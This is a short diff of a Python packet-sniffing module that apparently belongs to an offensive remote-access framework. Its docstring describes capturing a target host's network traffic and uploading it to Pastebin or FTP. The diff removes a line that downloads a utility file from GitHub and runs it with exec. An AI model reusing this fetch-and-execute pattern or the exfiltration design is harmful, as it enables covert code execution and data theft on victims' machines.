@@ -14,9 +14,7 @@ import binascii
 import StringIO
 
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import core.util as util
 
 # globals
 packages = []
@@ -28,10 +26,6 @@ desription = """
 Capture packets on the target client host machine's local network
 and optionally upload them to Pastebin or to a remote FTP server
 """
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, globals())
 
 # main
 def _udp_header(data):
